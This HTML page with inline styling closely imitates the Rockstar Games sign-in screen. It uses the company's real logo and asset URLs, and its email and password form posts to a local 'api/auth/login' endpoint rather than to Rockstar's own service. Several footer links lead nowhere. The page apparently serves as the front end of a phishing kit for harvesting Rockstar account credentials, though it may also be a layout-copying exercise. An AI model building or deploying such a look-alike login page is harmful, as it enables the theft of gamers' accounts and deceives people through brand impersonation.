<!DOCTYPE html>
<html lang="en">
<head>
<style>
*{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body{
    background-image: url('https://s.rsg.sc/auth/images/bg-repeat.png');
    background-repeat: repeat;
    background-size: 256px auto;
    position: relative;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
}

a{
    text-decoration: none;
    cursor: pointer;
}



main{
    display: flex;
    justify-content: center;
    width: 100%;
    flex: 1;
}

.main-container{
    display: flex;
    width: 500px;
    height: auto;
    flex-direction: column;
    justify-content: center;
    padding-top: 40px;
}

.logo{
    display: flex;
    margin-block: 20px;
    justify-content: center;
    height: auto;
}

.logo a{
    width: 101px;
    height: auto;
}

.logo img{
    width: 100%;
    /*height: 100%;*/
}

.form-container{
    display: flex;
    flex-direction: column;
    background-color: white;
    border-radius: 2px;
    padding: 20px;
}

.form-container h1{
    color: rgb(77, 77, 77);
    font-size: 24px;
    font-weight: 600;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    line-height: 30px;
}

.login-form-container{
    display: flex;
    flex-direction: column;
    margin-top: 20px;
}

.login-form{
    display: flex;
    flex-direction: column;
}

.login-form span:first-child{
    margin-bottom: 20px;
}

.login-form .input-container{
    display: flex;
    position: relative;
    width: 100%;
    height: 50px;
}

.login-form input{
    color: rgb(102, 102, 102);
    width: 100%;
    padding-inline: 20px;
    padding-top: 12px;
    border-radius: 3px;
    border: 1px solid rgb(230, 230, 230);
    font-size: 18px;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    font-weight: 400;
    line-height: 50px;
}

.login-form .textInput{
    color: rgb(77, 77, 77);
    font-size: 16px;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    line-height: 50px;
    position: absolute;
    left: 20px;
    top: 50%;
    transform: translateY(-50%) scale(1);
    transform-origin: left;
    transition: transform 0.2s ease;
    pointer-events: none;
}

.login-form input:focus{
    border: none;
    outline-color: rgb(11, 121, 208);
}

.login-form input:focus + .textInput,
.login-form input:not(:placeholder-shown) + .textInput {
    transform: translateY(calc(-50% - 13px)) scale(0.80);
    color: rgb(102, 102, 102);
}

.password-input{
    padding-inline: 20px 52px;
}

.password-button{
    position: absolute;
    top: 18px;
    right: 20px;
    bottom: 16px;
    border: none;
    background-color: inherit;
    width: 32px;
    height: 16px;
}

.password-button:hover{
    cursor: pointer;
}

.password-button svg{
    width: 16px;
    height: 16px;
}

.password-button svg path{
    fill: rgb(153, 153, 153);
}

.tooltip{
    position: absolute;
    top: 50%;
    right: 52px;
    transform: translateY(-50%) scale(0.8);
    transform-origin: right;
    transition: transform 0.2s ease, opacity 0.2s ease;
    opacity: 0;
    pointer-events: none;
    background-color: black;
    color: #ffffff;
    padding: 8px 16px;
    border-radius: 4px;
    white-space: nowrap;
    font-family: Arial, sans-serif;
    font-size: 14px;
    height: 50px;
}

.tooltip span{
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0;
    width: 100%;
    height: 100%;
}

.tooltip::after {
    content: "";
    position: absolute;
    top: 50%;
    left: 100%;
    transform: translateY(-50%);
    border-width: 5px;
    border-style: solid;
    border-color: transparent transparent transparent #1a1a1a;
}

.password-button:hover + .tooltip{
    opacity: 1;
    transform: translateY(-50%) scale(1);
}

.loginform__keepMeSignedInContainer{
    margin-top: 20px;
    height: 20px;
}


.login-form__checkbox{
    display: inline-flex;
    align-items: center;
    position: relative;
}

.checkbox{
    position: absolute;
    width: 1px;
    height: 1px;
    overflow: hidden;
    clip: rect(0 0 0 0);
}

.checkbox__label{
    position: relative;
    display: inline-block;
    padding-left: 30px;
    user-select: none;
    line-height: 20px;
    font-size: 16px;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    cursor: pointer;
}

.checkbox__label:before{
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    min-width: 18px;
    min-height: 18px;
    /*background-color: white;*/
    border: 1px solid black;
    border-radius: 3px;
    transition: background-color 0.2s ease;
}

.checkbox__label:after{
    content: "";
    position: absolute;
    left: 4px;
    top: 5px;
    width: 10px;
    height: 4px;
    border: solid rgb(51, 51, 51);
    border-width: 0 0 2px 2px;
    transform: rotate(-30deg) scale(0);
    opacity: 0;
    transition: transform 0.2s ease, opacity 0.2s ease;
}

.checkbox:checked + .checkbox__label::before {
    background-color: #ffffff;
}

.checkbox:checked + .checkbox__label::after {
    opacity: 1;
    transform: rotate(-45deg) scale(1); /* Плавное появление галочки */
}


.submit-container{
    margin-top: 20px;
    display: flex;
    flex-direction: row;
    justify-content:space-between;
    align-items: center;
}

.loginform__forgotPassword{
    color: rgb(26, 26, 26);
    cursor: pointer;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    font-size: 16px;
    text-decoration: underline;
}

.sign-in-button{
    padding-inline: 20px;
    background-color: rgb(252, 175, 23);
    border: 0.5px solid rgb(252, 175, 23);
    border-radius: 3px;
    cursor: pointer;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    font-size: 16px;
    font-weight: 700;
    line-height: 36px;
}

.sign-in-button:hover{
    background-color: rgb(247, 147, 30);
}



.sign-in-using-container{
    margin-top: 20px;
    padding: 20px;
    background-color: white;
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    border-radius: 2px;
}

.sign-in-using-container p{
    color: rgb(77, 77, 77);
    font-size: 18px;
    font-weight: 500;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    min-width: 50%;
}

.third-party-login-container{
    display: flex;
    flex-direction: row;
}

.sign-in-using-container a{
    width: 65px;
    height: 65px;
}

.sign-in-using-container a:first-child{
    margin-right: 10px;
}

.sign-in-using-container a img{
    width: 100%;
    height: 100%;
}



.create-account-container{
    margin-block: 20px;
    padding-block: 10px;
}

.create-account-container p{
    color: white;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    font-size: 16px;
    width: 500px;
    text-align: center;
}

.create-account-container a{
    color: rgb(252, 175, 23);
    text-decoration: underline;
}


footer{
    margin-block: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
}

footer ul{
    padding-inline: 10px;
}

footer ul li{
    display: inline-block;
    margin-left: 1px;
    padding-left: 5px;
    border-left: 1px solid rgb(153, 153, 153);
    color: rgba(255, 255, 255, 0.8);
    font-size: 12px;
    font-family: -apple-system, BlinkMacSystemFont, Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    line-height: 12px;
    text-align: center;
    text-transform: uppercase;
}

footer ul li:first-child{
    color: rgb(153, 153, 153);
    border: none;
    margin: 0;
    padding: 0;
}

footer ul li a:hover{
    text-decoration: underline;
    color: white;
    transition: color 0.2s ease-out;
}




</style>
    <meta charset="UTF-8">
    <title>Sign In - Rockstar Games</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="https://s.rsg.sc/auth/rockstar.ico">
</head>
<body>
<main>
    <div class="main-container">
        <div class="logo">
            <a href="https://www.rockstargames.com?redirect_lang=us" aria-label="Rockstar Games">
                <img src="https://s.rsg.sc/auth/images/logo_20231030.svg" alt="Rockstar Games Logo">
            </a>
        </div>

        <div class="form-container">
            <h1>Sign In</h1>
            <div class="login-form-container">
                <form class="login-form" method="POST" action="api/auth/login" id="mainLoginForm">
                    <span class="input-container">
                        <input id="text-input-id" type="email" name="email"
                               placeholder=" ">
                        <label class="textInput" for="text-input-id">
                            <span>Email</span>
                        </label>
                    </span>
                    <span class="input-container">
                        <input class="password-input" type="password" name="password" placeholder=" ">
                        <label class="textInput">
                            <span>Password</span>
                        </label>
                        <button class="password-button" aria-label="Reveal password" type="button">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" height="16" width="16"
                                 class="UI__Icon__icon" data-ui-name="visibility_off_icon" aria-hidden="false"
                                 id="ui-icon-visibility_off-30">
                                <path d="M29.8 17.2c-2.2 1.7-4.6 3-7.1 3.7l-2.5-2.5c.6-.8.9-1.8.9-2.9 0-1.4-.5-2.6-1.5-3.6-1.7-1.7-4.5-1.9-6.4-.6l-1.7-1.7c6.3-1.3 12.9.1 18.4 4.3.6.5 1.5.4 1.9-.2.5-.6.4-1.5-.2-1.9-6.7-5.1-14.9-6.6-22.4-4.4L5.7 3.9c-.5-.5-1.4-.5-1.9 0s-.5 1.4 0 1.9l2.6 2.6c-2 .9-4 2-5.8 3.4-.6.5-.7 1.3-.2 1.9.3.3.7.5 1.1.5.3 0 .6-.1.8-.3 1.9-1.5 4-2.6 6.2-3.4l2.9 2.9c-.3.6-.4 1.2-.4 1.8 0 .8.5 1.4 1.3 1.5.6.1 1.2-.4 1.4-1l2.2 2.2c-.2 0-.3 0-.5-.1-.7-.2-1.5.2-1.7.9-.2.7.2 1.5.9 1.7.5.2 1 .2 1.5.2.7 0 1.4-.2 2.1-.5l1.5 1.5c-6 1-12.2-.5-17.3-4.5-.6-.5-1.5-.4-1.9.2-.5.6-.4 1.5.2 1.9 4.6 3.6 10 5.4 15.5 5.4 2 0 3.9-.2 5.9-.7l4.1 4.1c.3.3.6.4 1 .4s.7-.1 1-.4c.5-.5.5-1.4 0-1.9L25.1 23c2.3-.9 4.6-2.1 6.6-3.7.6-.5.7-1.3.2-1.9-.7-.6-1.5-.7-2.1-.2zm-12.2-3.3c.4.4.7 1 .7 1.7 0 .3-.1.6-.2.8l-3-3c.9-.3 1.9-.1 2.5.5z"></path>
                            </svg>
                        </button>
                        <div class="tooltip">
                            <span>Reveal password</span>
                        </div>
                    </span>
                </form>
            </div>

            <div class="loginform__keepMeSignedInContainer">
                <span class="loginform__checkbox">
                    <input id="box" class="checkbox" type="checkbox" name="keepMeSignedIn" value="">
                    <label for="box" class="checkbox__label">
                        Keep me signed in
                    </label>
                </span>
            </div>

            <div class="submit-container">
                <p>
                    <a class="loginform__forgotPassword" href="/forgotten-password?cid=rsg">
                        Forgot your password?
                    </a>
                </p>
                <button class="sign-in-button" type="submit" form="mainLoginForm">
                    Sign in
                </button>
            </div>

        </div>

        <div class="sign-in-using-container">

            <p>Sign in using</p>
            <div class="third-party-login-container">
                <a class="Login__tpaIcon" href="/tpa/np/login?cid=rsg&returnUrl=%2F">
                    <img alt="np icon" class="ThirdPartyIcon__icon"
                         src="https://s.rsg.sc/auth/images/icons/colored/np.svg">
                </a>
                <a class="Login__tpaIcon" href="/tpa/xbl/login?cid=rsg&returnUrl=%2F">
                    <img alt="xbl icon" class="ThirdPartyIcon__icon"
                         src="https://s.rsg.sc/auth/images/icons/colored/xbl.svg">
                </a>
            </div>

        </div>

        <div class="create-account-container">
            <p>
                Don't have a Rockstar Games account?
                <a href="/create?cid=rsg">Create a new account</a>
            </p>
        </div>
    </div>
</main>
<footer>
    <ul class="info-list">
        <li class="info-list__item">
            © 2026 Rockstar Games
        </li>
        <li class="info-list__item">
            <a>Privacy Policy</a>
        </li>
        <li class="info-list__item">
            <a>Terms of Service</a>
        </li>
        <li class="info-list__item">
            <a>Cookie Settings</a>
        </li>
    </ul>
</footer>
</body>
</html>
